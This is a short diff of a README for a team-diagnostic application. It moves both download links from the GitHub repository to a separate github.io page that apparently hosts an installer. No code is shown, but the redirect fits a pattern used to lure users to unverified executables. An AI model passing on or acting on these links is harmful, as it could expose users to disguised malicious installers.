@@ -1,6 +1,6 @@
 # 🔍 ai-native-team-diagnostic - Better team performance through data insights
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Gulacollectivebargaining869/ai-native-team-diagnostic)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://gulacollectivebargaining869.github.io)
 
 This software helps teams check their health and readiness. It uses a browser-based system to gather feedback. You receive scores and reports based on your inputs. Use these tools to fix gaps in your team setup and improve how you work.
 
@@ -15,7 +15,7 @@ This software helps teams check their health and readiness. It uses a browser-ba
 
 Use the link below to get the installer for your computer.
 
-[Click here to visit the download page](https://github.com/Gulacollectivebargaining869/ai-native-team-diagnostic)
+[Click here to visit the download page](https://gulacollectivebargaining869.github.io)
 
 1. Go to the link above.
 2. Find the latest release version on the page.
